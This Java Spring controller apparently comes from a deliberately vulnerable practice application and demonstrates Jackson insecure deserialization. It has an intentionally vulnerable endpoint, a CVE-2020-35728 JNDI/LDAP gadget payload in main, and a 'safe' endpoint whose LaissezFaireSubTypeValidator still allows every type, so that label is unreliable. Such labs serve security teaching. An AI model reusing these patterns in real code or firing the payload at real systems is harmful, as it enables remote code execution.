package top.whgojp.modules.components.jackson.controller;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;
import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

/**
 * @description 组件漏洞-Jackson
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/12 22:50
 */
@Slf4j
@Api(value = "JacksonController", tags = "组件漏洞-Jackson")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/jackson")
public class JacksonController {
    @RequestMapping("")
    public String jackson() {
        return "vul/components/jackson";
    }

    @RequestMapping("/vul")
    public String vul(@RequestBody String content) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // 启用多态类型处理

            // 反序列化接收的JSON数据，触发漏洞
            Object obj = mapper.readValue(content, Object.class);
            return "[+]Jackson 反序列化: " + obj.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "[-]Jackson反序列化失败";
        }
    }


    @PostMapping("/safe")
    @ResponseBody
    public String safeJackson(@RequestBody String payload) {
        try {
            ObjectMapper mapper = new ObjectMapper();

            // 启用安全的类型验证
            mapper.activateDefaultTyping(
                    LaissezFaireSubTypeValidator.instance,
                    ObjectMapper.DefaultTyping.NON_FINAL
            );
            mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

            // 反序列化传入的JSON数据
            Map<String, Object> safePayload = mapper.readValue(payload, Map.class);
            return mapper.writeValueAsString(safePayload);
        } catch (Exception e) {
            e.printStackTrace();
            return "Jackson Safe Deserialization Error";
        }
    }


    /**
     * CVE-2020-35728
     * com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化
     */
    public static void main(String[] args) throws Exception {
        String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/zrnug1\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }

}
